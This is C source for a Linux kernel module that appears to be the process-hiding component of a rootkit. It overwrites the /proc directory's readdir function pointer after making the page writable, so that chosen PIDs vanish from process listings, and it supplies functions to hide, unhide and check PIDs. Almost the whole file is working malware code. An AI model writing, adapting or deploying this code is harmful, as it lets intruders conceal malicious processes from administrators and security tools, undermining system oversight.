#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/sched.h>
#include <linux/list.h>
#include <linux/proc_fs.h>

#include "sysmap.h"          /* Pointers to system functions */
#include "global.h"
#include "hide_processes.h"

// for convenience, I'm using the following notations for fun pointers:
// fun_<return type>_<arg1>_<arg2>_<arg3>_...

// for hooking the original read function
typedef int (*int_filep_voidp_filldir_t) (struct file *, void *, filldir_t);

int_filep_voidp_filldir_t proc_original_readdir;
filldir_t original_proc_fillfir;


struct proc_to_hide {
    struct list_head list;
    int pid;
};

char pid_buffer[11];
struct proc_dir_entry* proc;

struct list_head processes_to_hide;


int hooked_proc_filldir(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type){
    char buf[512];
    struct list_head* cur;
    struct proc_to_hide* proc;
    list_for_each(cur, &processes_to_hide){
        proc = list_entry(cur, struct proc_to_hide, list);
        sprintf(buf, "%d", proc->pid);
        if(strcmp(buf, name)==0){
            // OUR_DEBUG("Hiding pid %s \n", char_pids_to_hide[i]);
            return 0;
        }
    }
    return original_proc_fillfir(__buf, name, namelen, offset, ino, d_type);
}

int hooked_readdir(struct file *filep, void *dirent, filldir_t filldir)
{
    original_proc_fillfir = filldir;
    return proc_original_readdir(filep, dirent, hooked_proc_filldir);
}

void load_processhiding(void)
{
    const char *myname = "hoooookMe";
    struct file_operations *proc_fops;
    struct proc_dir_entry *key = create_proc_entry(myname, 0666, NULL);

    proc = key->parent;

    remove_proc_entry(myname, proc);

    proc_fops = (struct file_operations *)proc->proc_fops;

    proc_original_readdir = proc_fops->readdir;

    make_page_writable((long unsigned int) proc_fops);

    proc_fops->readdir = hooked_readdir;
    INIT_LIST_HEAD(&processes_to_hide);
}

void hide_proc(int pid){
    struct proc_to_hide* toHide;
    if(is_hidden(pid)) {
        // is already hidden, nothin to do
        return;
    }
    toHide = kmalloc(sizeof(struct proc_to_hide), GFP_KERNEL);
    toHide->pid = pid;
    list_add(&toHide->list, &processes_to_hide);
}

int is_hidden(int pid){
    struct list_head* cur;
    struct proc_to_hide* proc;
    list_for_each(cur, &processes_to_hide){
        proc = list_entry(cur, struct proc_to_hide, list);
        if(proc->pid == pid){
            return 1;
        }
    }
    return 0;
}

void unhide_proc(int pid){
    struct proc_to_hide* proc;
    struct list_head *cur, *cur2;
    list_for_each_safe(cur, cur2, &processes_to_hide){
        proc = list_entry(cur, struct proc_to_hide, list);
        if(proc->pid == pid){
            list_del(cur);
            kfree(proc);
            break;
        }
    }
}

void unload_processhiding(void)
{
    struct file_operations *proc_fops = (struct file_operations *)proc->proc_fops;
    struct list_head *pos, *pos2;
    struct proc_to_hide* proc;

    make_page_writable((long unsigned int) proc_fops);
    proc_fops->readdir = proc_original_readdir;
    make_page_readonly((long unsigned int) proc_fops);

    list_for_each_safe(pos, pos2, &processes_to_hide){
        proc = list_entry(pos, struct proc_to_hide, list);
        list_del(pos);
        kfree(proc);
    }
}
